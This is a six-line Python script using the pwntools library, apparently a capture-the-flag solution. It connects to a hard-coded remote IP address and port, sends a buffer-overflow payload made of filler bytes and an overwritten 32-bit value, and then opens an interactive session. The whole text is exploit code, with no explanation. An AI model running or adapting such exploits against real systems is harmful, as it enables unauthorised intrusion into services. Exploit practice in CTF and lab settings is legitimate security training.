from pwn import *
r=remote("183.129.189.60",10020)
adr=0xffd47fbc
payload=(0x70-0xc)*"a"+p32(0x4)
r.sendline(payload)
r.interactive()
